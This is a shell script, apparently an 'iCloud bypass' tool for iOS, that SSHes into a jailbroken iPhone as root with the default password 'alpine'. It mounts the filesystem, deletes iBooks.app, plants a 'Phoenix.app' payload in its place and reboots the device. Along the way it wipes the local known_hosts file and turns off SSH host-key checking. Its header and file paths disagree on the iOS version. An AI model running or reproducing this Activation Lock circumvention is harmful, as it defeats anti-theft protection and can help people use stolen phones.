


# @ios_euphoria GreenSn0w Injection Payload
# iOS 12 iCloud Bypass Tethered No Signal

#stop asking me if i want to fucking save the damn key
rm -rf ~/.ssh/known_hosts

# Change the current working directory
cd "`dirname "$0"`"

# Check for Homebrew, install if we don't have it
if test ! $(which brew); then
    echo "Installing homebrew..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" > /dev/null 2>&1
    echo ''
fi

# Check for sshpass, install if we don't have it
if test ! $(which sshpass); then
    echo "Installing sshpass..."
    brew install esolitos/ipa/sshpass > /dev/null 2>&1
    echo ''
fi

# Check for iproxy, install if we don't have it
if test ! $(which iproxy); then
    echo "Installing iproxy..."
    brew install libimobiledevice > /dev/null 2>&1
    echo ''
fi

sleep 1

echo ''

echo 'Starting iproxy...'

# Run iproxy in the background
iproxy 2222:22 > /dev/null 2>&1 &

sleep 2

while true ; do
  result=$(ssh -p 2222 -o BatchMode=yes -o ConnectTimeout=1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@localhost echo ok 2>&1 | grep Connection)

  if [ -z "$result" ] ; then

echo "Mounting..."
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no -p 2222 "root@localhost" 'mount.sh'
echo "Mounted!"



echo "------"


#kill CommCenter and CommCenterMobileHelper
#echo "KIlling CommCenter and CommCenterMobileHelper..."
#sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no root@localhost -p 4444 killall CommCenter && killall CommCenterMobileHelper
#echo "KIlled CommCenter and CommCenterMobileHelper!"

#echo "Unlocking file..."
#sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no -p 4444 "root@localhost" 'chflags nouchg /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist'
#echo "Unlocked file!"

echo "Deleting iBooks.app..."
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no -p 2222 "root@localhost" 'rm -rf /mnt1/Applications/iBooks.app/'
echo "Deleted iBooks.app!"

echo "Pushing file..."
sshpass -p 'alpine' scp -rP 2222 -o StrictHostKeyChecking=no /Users/user/Desktop/RequestRacoon-iOS15-16/Payload/Phoenix.app/ root@localhost:/mnt1/Applications/iBooks.app/
echo "File pushed!"

#echo "Locking file..."
#sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no -p 4444 "root@localhost" 'chflags uchg /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist'
#echo "Locked file!"

echo "Sending reboot command..."
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no -p 2222 "root@localhost" 'reboot_bak'
echo "Device is rebooting!"

#ideviceactivation state

# Kill iproxy
kill %1 > /dev/null 2>&1

echo 'File upload Done!'

sleep 1

    break

  fi

  osascript -e 'display alert "Connection failed." message "Try re-jailbreaking again..."'
  break

  sleep 1

done
